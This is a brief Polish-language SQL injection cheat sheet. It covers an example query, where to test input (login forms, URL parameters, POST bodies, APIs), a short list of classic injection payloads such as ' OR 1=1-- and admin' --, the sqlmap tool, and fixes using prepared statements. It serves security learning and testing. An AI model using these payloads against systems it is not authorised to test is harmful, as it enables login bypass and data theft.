# SQL Injection

## Co to jest
SQLi pozwala manipulować zapytaniami SQL.

## Przykład

```sql
SELECT * FROM users WHERE id='1'
```

Payload:

```sql
' OR '1'='1
```

## Jak testować
- login forms
- URL parameters
- POST body
- API

## Payloady
'
''
' OR 1=1--
admin' --

## Narzędzia
- sqlmap

## Jak naprawić
- prepared statements
- parameterized queries
